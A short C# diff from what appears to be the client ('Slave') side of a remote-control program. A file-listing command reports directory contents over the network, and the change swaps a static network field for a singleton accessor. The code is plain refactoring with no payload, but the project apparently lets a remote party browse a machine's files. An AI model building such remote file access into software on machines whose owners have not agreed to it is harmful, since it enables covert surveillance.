@@ -2,6 +2,7 @@
 using Shared;
 using System.Collections.Generic;
 using System.IO;
+using Slave.Core;
 
 namespace Slave.Commands.Core
 {
@@ -26,13 +27,13 @@ namespace Slave.Commands.Core
                     result += $"{fileInfo.LastWriteTime:MM/dd/yy  HH:mm:ss}           {fileInfo.Name}\n";
                 }
 
-                SlaveCommandsManager.networkManager.WriteLine(result);
+                SlaveNetworkManager.GetInstance().WriteLine(result);
             }
             catch (Exception)
             {
-                SlaveCommandsManager.networkManager.WriteLine("<Not enough permissions>");
+                SlaveNetworkManager.GetInstance().WriteLine("<Not enough permissions>");
             }
-            SlaveCommandsManager.networkManager.WriteLine("{end}");
+            SlaveNetworkManager.GetInstance().WriteLine("{end}");
         }
     }
 }
